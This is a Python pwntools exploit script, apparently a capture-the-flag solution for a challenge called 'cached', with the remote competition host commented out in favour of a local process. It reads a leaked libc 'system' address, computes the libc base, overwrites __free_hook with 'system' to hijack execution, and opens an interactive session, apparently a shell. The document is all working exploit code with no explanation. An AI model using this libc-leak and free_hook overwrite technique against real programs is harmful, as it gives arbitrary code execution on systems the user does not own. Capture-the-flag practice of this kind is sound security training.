#!/usr/bin/python3
from pwn import *
import re

exe = 'cached_patched'
elf = context.binary = ELF(exe, checksec = False)
context.log_level='debug'

libc = ELF('libc.so.6')

#io = remote('cached.chal.idek.team',1337)
io = process(exe)
io.sendlineafter(b'Press',b'\r')
io.sendlineafter(b'Press',b'\r')
io.recvlines(11)
system = int(re.search(r"system.*(0x[\w\d]+)", io.recvS()).group(1).rstrip(), 16)
info(f"System Leaked: {hex(system)}")
libc.address = system - libc.symbols.system
info(f"Libc address: {hex(libc.address)}")
free_hook = libc.symbols['__free_hook']
info(f"free_hook: {hex(free_hook)}")

io.sendline(p64(free_hook))
io.sendline(p64(system))

io.interactive()
